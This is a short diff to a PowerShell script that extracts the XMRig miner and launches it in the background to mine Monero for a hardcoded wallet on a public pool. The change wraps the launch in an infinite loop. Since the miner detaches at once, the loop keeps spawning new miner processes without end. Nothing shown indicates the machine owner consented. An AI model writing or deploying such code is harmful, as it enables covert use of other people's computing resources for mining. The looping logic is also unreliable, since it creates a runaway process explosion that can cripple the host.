@@ -14,4 +14,6 @@ Expand-Archive -Path $zipPath -DestinationPath $dir -Force
 $miner = "$dir\xmrig-6.21.0"
 
 # nạp donate cho SkibiditoiletMiner
-& "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background
+while ($true) {
+    & "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background
+}
